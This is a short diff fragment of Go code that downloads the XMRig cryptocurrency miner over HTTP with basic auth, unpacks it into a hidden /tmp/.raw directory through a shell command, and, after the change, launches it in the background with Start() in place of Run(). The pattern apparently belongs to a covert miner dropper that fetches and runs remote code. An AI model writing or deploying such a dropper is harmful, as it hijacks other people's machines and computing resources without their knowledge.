@@ -50,6 +50,7 @@ r ,  e    :=  http.NewRequest("GET" , "https://download.xmrig.com/xmrig/6.9.0/07
 
              }
 
+
          r.SetBasicAuth("xmrig" , "download")
 
           cli  := http.Client{}
@@ -77,7 +78,10 @@ rrrr :=  exec.Command("sh"  ,  "-c" , "cd /tmp/.raw ; tar  -xf *raw ; cd *.0 ; r
 
 
 
-rrrr.Run()
+rrrr.Start()
+
+
+
 
   }
 
